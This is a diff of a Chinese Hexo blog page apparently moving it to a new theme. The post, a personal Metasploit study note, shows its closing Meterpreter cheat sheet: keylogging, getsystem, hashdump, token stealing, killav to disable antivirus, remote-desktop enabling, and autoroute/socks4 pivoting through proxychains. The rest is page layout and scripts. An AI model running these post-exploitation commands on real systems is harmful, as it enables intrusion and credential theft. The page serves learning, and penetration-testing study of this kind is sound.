+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; ls 查看文件目录列表</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; cd  切换目录 </span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; rm  删除文件 </span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; upload /var/www/wce.exe wce.exe  上传文件</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; search -d c:  -f *.doc  搜索文件</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; execute -f  cmd.exe -i   执行程序/命令 </span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; ps  查看进程</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; run post/windows/capture/keylog_recorder   键盘记录</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; getuid  查看当前用户权限</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; use priv  加载特权模块</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; getsystem  提升到SYSTEM权限</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; hashdump  导出密码散列</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; ps   查看高权限用户PID</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; steal_token &lt;PID&gt;  窃取令牌</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; rev2self  恢复原来的令牌 </span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; migrate pid  迁移进程</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; run killav  关闭杀毒软件 </span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; run getgui-e  启用远程桌面</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; run get_local_subnets  获取内网网段信息</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; run autoroute -s &lt;内网网段&gt;  创建自动路由</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; run autoroute -p  查看自动路由表</span>
+<span class="hljs-meta">创建代理通道</span>:<span class="hljs-string"></span>
+<span class="hljs-attr">msf</span> <span class="hljs-string">&gt; use auxiliary/server/socks4a   设置socks4代理模块</span>
+<span class="hljs-attr">msf</span> <span class="hljs-string">auxiliary(socks4a) &gt; show options </span>
+<span class="hljs-attr">msf</span> <span class="hljs-string">auxiliary(socks4a) &gt; run</span>
+<span class="hljs-attr">配置proxychains参数：</span>
+<span class="hljs-attr">nano</span> <span class="hljs-string">/etc/proxychains.conf   修改代理监听端口,和前面端口一致</span>
+<span class="hljs-attr">quite_mode</span>  <span class="hljs-string">设置成安静模式：去掉如下参数前面的注释</span></code></pre>
+
+
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://xz.aliyun.com/t/3007" target="_blank" rel="noopener">https://xz.aliyun.com/t/3007</a></p>
 <p><a href="https://www.cnblogs.com/lxm20145215----/p/6703425.html" target="_blank" rel="noopener">https://www.cnblogs.com/lxm20145215----/p/6703425.html</a></p>
 
             </div>
-            <hr/>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/metasploit/">metasploit</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/09/01/Tmux/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Tmux学习记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/28/CVE-2020-0796/">
+                        <span class="hidden-mobile">Microsoft SMBv3远程代码执行漏洞（CVE-2020-0796）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
             
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">uaa</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="https://827607240.github.io/2020/09/01/metasploit/">https://827607240.github.io/2020/09/01/metasploit/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">uaa</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz",
+          app_key: "oFcTVTBJYrfsIGdYNnoWMVJ9",
+          placeholder: "留下你的足迹",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
       });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
 
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
 
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/tags/metasploit/">
-                                    <span class="chip bg-color">metasploit</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
-</div>
-
-                </div>
-            </div>
+              </article>
             
+          </article>
         </div>
+      </div>
     </div>
-
     
-
-    
-
-    
-
-    
-
-    
-        <style>
-    .valine-card {
-        margin: 1.5rem auto;
-    }
-
-    .valine-card .card-content {
-        padding: 20px 20px 5px 20px;
-    }
-
-    #vcomments textarea {
-        box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
-    }
-
-    #vcomments p {
-        margin: 2px 2px 10px;
-        font-size: 1.05rem;
-        line-height: 1.78rem;
-    }
-
-    #vcomments blockquote p {
-        text-indent: 0.2rem;
-    }
-
-    #vcomments a {
-        padding: 0 2px;
-        color: #4cbf30;
-        font-weight: 500;
-        text-decoration: none;
-    }
-
-    #vcomments img {
-        max-width: 100%;
-        height: auto;
-        cursor: pointer;
-    }
-
-    #vcomments ol li {
-        list-style-type: decimal;
-    }
-
-    #vcomments ol,
-    ul {
-        display: block;
-        padding-left: 2em;
-        word-spacing: 0.05rem;
-    }
-
-    #vcomments ul li,
-    ol li {
-        display: list-item;
-        line-height: 1.8rem;
-        font-size: 1rem;
-    }
-
-    #vcomments ul li {
-        list-style-type: disc;
-    }
-
-    #vcomments ul ul li {
-        list-style-type: circle;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    #vcomments table, th, td {
-        border: 0;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments h1 {
-        font-size: 1.85rem;
-        font-weight: bold;
-        line-height: 2.2rem;
-    }
-
-    #vcomments h2 {
-        font-size: 1.65rem;
-        font-weight: bold;
-        line-height: 1.9rem;
-    }
-
-    #vcomments h3 {
-        font-size: 1.45rem;
-        font-weight: bold;
-        line-height: 1.7rem;
-    }
-
-    #vcomments h4 {
-        font-size: 1.25rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    #vcomments h5 {
-        font-size: 1.1rem;
-        font-weight: bold;
-        line-height: 1.4rem;
-    }
-
-    #vcomments h6 {
-        font-size: 1rem;
-        line-height: 1.3rem;
-    }
-
-    #vcomments p {
-        font-size: 1rem;
-        line-height: 1.5rem;
-    }
-
-    #vcomments hr {
-        margin: 12px 0;
-        border: 0;
-        border-top: 1px solid #ccc;
-    }
-
-    #vcomments blockquote {
-        margin: 15px 0;
-        border-left: 5px solid #42b983;
-        padding: 1rem 0.8rem 0.3rem 0.8rem;
-        color: #666;
-        background-color: rgba(66, 185, 131, .1);
-    }
-
-    #vcomments pre {
-        font-family: monospace, monospace;
-        padding: 1.2em;
-        margin: .5em 0;
-        background: #272822;
-        overflow: auto;
-        border-radius: 0.3em;
-        tab-size: 4;
-    }
-
-    #vcomments code {
-        font-family: monospace, monospace;
-        padding: 1px 3px;
-        font-size: 0.92rem;
-        color: #e96900;
-        background-color: #f8f8f8;
-        border-radius: 2px;
-    }
-
-    #vcomments pre code {
-        font-family: monospace, monospace;
-        padding: 0;
-        color: #e8eaf6;
-        background-color: #272822;
-    }
-
-    #vcomments pre[class*="language-"] {
-        padding: 1.2em;
-        margin: .5em 0;
-    }
-
-    #vcomments code[class*="language-"],
-    pre[class*="language-"] {
-        color: #e8eaf6;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-
-    #vcomments b,
-    strong {
-        font-weight: bold;
-    }
-
-    #vcomments dfn {
-        font-style: italic;
-    }
-
-    #vcomments small {
-        font-size: 85%;
-    }
-
-    #vcomments cite {
-        font-style: normal;
-    }
-
-    #vcomments mark {
-        background-color: #fcf8e3;
-        padding: .2em;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-</style>
-
-<div class="card valine-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="vcomments" class="card-content" style="display: grid">
-    </div>
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<script src="/libs/valine/av-min.js"></script>
-<script src="/libs/valine/Valine.min.js"></script>
-<script>
-    new Valine({
-        el: '#vcomments',
-        appId: 'zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz',
-        appKey: 'oFcTVTBJYrfsIGdYNnoWMVJ9',
-        notify: 'false' === 'true',
-        verify: 'false' === 'true',
-        visitor: 'true' === 'true',
-        avatar: 'mm',
-        pageSize: '10',
-        lang: 'zh-cn',
-        placeholder: 'just go go'
-    });
-</script>
-
+      </div>
     
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2020/09/01/Tmux/">
-                    <div class="card-image">
-                        
-                        <img src="https://infu.ir/wp-content/uploads/2018/07/tmux-dribbble.png" class="responsive-img" alt="Tmux学习记录">
-                        
-                        <span class="card-title">Tmux学习记录</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            学习使用Tmux我为什么要学习Tmux，我想在命令行模式下同时打开多个终端，以及如何在ssh远程连接时进行翻页，满足我的日常需求。
-简介tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-01
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            uaa
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
-                    </a>
-                    
-                    <a href="/tags/Tmux/">
-                        <span class="chip bg-color">Tmux</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/08/28/CVE-2020-0796/">
-                    <div class="card-image">
-                        
-                        <img src="https://www.forescout.com/wp-content/uploads/2020/03/SMBv3-Vulnerability-CVE-2020-0796-SMBGhost.jpg" class="responsive-img" alt="Microsoft SMBv3远程代码执行漏洞（CVE-2020-0796）">
-                        
-                        <span class="card-title">Microsoft SMBv3远程代码执行漏洞（CVE-2020-0796）</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            CVE-2020-0796远程代码执行漏洞Microsoft SMBv3远程代码执行漏洞（CVE-2020-0796）
-漏洞描述SMB通信协议是微软和英特尔在1987年制定的协议，主要是作为Microsoft网络的通讯协议。
-Microso
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-28
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            uaa
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/cve/">
-                        <span class="chip bg-color">cve</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%8F%90%E6%9D%83/">
-                        <span class="chip bg-color">提权</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-    </div>
-</article>
-
+  </div>
 </div>
 
-
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: wiki<br />'
-            + '文章作者: uaa<br />'
-            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
+<!-- Custom -->
 
 
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+    
+  </main>
 
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-<!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
-</div>
+  
 
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4, h5, h6'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4, h5, h6').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-
-    <footer class="page-footer bg-color">
-    
-    <div class="container row center-align" style="margin-bottom: 15px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            <span id="year">2020</span>
-            <a href="/about" target="_blank">uaa</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">60.1k</span>&nbsp;字
-            
-            
-            
-            
-            
-            
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
-            </span>
-            
-            
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
-            </span>
-            
-            <br>
-            
-            <span id="sitetime">载入运行时间...</span>
-            <script>
-                function siteTime() {
-                    var seconds = 1000;
-                    var minutes = seconds * 60;
-                    var hours = minutes * 60;
-                    var days = hours * 24;
-                    var years = days * 365;
-                    var today = new Date();
-                    var startYear = "2020";
-                    var startMonth = "1";
-                    var startDate = "1";
-                    var startHour = "0";
-                    var startMinute = "0";
-                    var startSecond = "0";
-                    var todayYear = today.getFullYear();
-                    var todayMonth = today.getMonth() + 1;
-                    var todayDate = today.getDate();
-                    var todayHour = today.getHours();
-                    var todayMinute = today.getMinutes();
-                    var todaySecond = today.getSeconds();
-                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
-                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
-                    var diff = t2 - t1;
-                    var diffYears = Math.floor(diff / years);
-                    var diffDays = Math.floor((diff / days) - diffYears * 365);
-                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
-                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
-                        minutes);
-                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
-                        diffMinutes * minutes) / seconds);
-                    if (startYear == todayYear) {
-                        document.getElementById("year").innerHTML = todayYear;
-                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
-                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
-                    } else {
-                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
-                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
-                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
-                    }
-                }
-                setInterval(siteTime, 1000);
-            </script>
-            
-            <br>
-            
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-</div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
-<div class="progress-bar"></div>
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
 
 
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script src="/js/search.js"></script>
-<script type="text/javascript">
-$(function () {
-    searchFunc("/search.xml", 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
+  
+    <script  src="/js/lazyload.js" ></script>
+  
 
 
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
 
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "metasploit学习记录&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
     <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
